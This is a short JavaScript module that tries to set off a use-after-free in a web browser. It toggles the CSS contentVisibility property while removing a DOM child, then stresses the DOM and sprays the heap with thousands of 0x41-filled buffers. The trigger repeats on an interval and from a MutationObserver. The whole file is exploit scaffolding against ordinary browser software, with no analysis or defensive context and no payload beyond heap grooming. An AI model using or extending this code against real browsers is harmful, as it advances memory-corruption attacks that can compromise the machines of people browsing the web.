import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    arr.fill(0x41); // Fill with 'A'
    spray.push(arr);
  }
  return spray;
}

function aggressiveHeapSpray(rounds = 30) {
  let sprays = [];
  for (let r = 0; r < rounds; r++) {
    sprays.push(heapSpray());
  }
  return sprays;
}

function stressDOM() {
  for (let i = 0; i < 200; i++) {
    const temp = document.createElement("div");
    temp.className = "child";
    container.appendChild(temp);
    container.removeChild(temp);
  }
}

export function triggerUAF() {
  container.style.contentVisibility = "hidden";
  child.remove();
  requestAnimationFrame(() => {
    container.style.contentVisibility = "auto";
    stressDOM();
    aggressiveHeapSpray(50); // muy agresivo
    debug_log("Aggressive UAF triggered.");
  });
}

export function triggerUAFRepeated() {
  let count = 0;
  const interval = setInterval(() => {
    if (count++ > 50) {
      clearInterval(interval);
      debug_log("Stopped after 50 iterations.");
    }
    triggerUAF();
  }, 50);
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF...");
  triggerUAF();
});

observer.observe(container, { childList: true, subtree: true });
